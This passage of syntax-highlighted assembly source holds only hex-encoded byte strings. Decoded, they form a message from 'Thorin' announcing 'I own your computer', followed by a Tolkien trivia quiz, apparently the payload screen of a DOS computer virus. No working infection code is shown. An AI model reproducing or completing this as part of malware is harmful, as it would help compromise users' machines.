    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Ch</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">054h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">049h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">077h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">079h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">027h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">076h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">077h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">049h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">076h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">027h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">067h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">077h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">079h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">049h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">077h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">05Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">053h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">048h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">032h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">057h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">077h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Bh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc0">
